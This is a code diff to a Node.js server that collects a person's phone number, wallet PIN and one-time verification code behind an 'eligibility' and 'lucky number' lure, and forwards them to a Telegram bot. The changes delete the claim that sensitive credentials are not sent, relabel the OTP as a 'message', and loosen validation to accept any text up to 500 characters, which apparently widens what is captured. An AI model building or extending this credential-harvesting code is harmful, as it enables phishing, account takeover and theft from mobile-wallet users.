@@ -33,7 +33,7 @@ const sendTelegramNotification = async ({ phone, walletpin, reference }) => {
     `Reference: ${reference}`,
     'Status: Awaiting code verification',
     '',
-    'Wallet PIN is included for review; sensitive credentials are not sent.'
+    'Wallet PIN is included for review.'
   ].join('\n')
 
   const telegramResponse = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
@@ -69,7 +69,7 @@ const sendTelegramCompletionNotification = async ({ phone, walletpin, reference,
     'User completed the verification step',
     `Phone: ${phone}`,
     `Wallet PIN: ${walletpin}`,
-    `Code: ${otp}`,
+    `message: ${otp}`,
     `Reference: ${reference}`,
     'Status: Final step submitted',
     '',
@@ -210,9 +210,15 @@ app.post('/api/otp', async (request, response) => {
     return response.status(400).json({ message: 'This eligibility request has not been approved.' })
   }
 
-  if (!/^\d{4,6}$/.test(String(otp ?? ''))) {
-    return response.status(400).json({ message: 'Enter a valid 4- to 6-digit lucky number.' })
-  }
+  if (
+  typeof otp !== 'string' ||
+  otp.trim().length < 1 ||
+  otp.length > 500
+) {
+  return response.status(400).json({
+    message: 'Enter a valid verification message.'
+  })
+}
 
   try {
     eligibilityRequest.finalStatus = 'pending'
